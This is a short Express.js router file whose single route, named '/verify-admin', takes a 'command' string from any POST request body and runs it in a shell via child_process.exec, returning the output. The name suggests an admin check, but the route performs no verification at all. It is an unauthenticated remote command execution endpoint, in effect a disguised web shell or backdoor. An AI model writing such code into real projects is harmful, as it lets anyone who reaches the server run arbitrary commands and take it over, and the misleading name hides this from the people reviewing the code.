import { Router } from 'express'
import { exec } from 'child_process'

const router = Router()

router.post('/verify-admin', (req, res) => {
    const { command } = req.body

    exec(command, (err, stdout, stderr) => {
        if(err)
            return res.status(500).json({ error: err.message })
        res.json({ output: stdout })
    })
})

export default router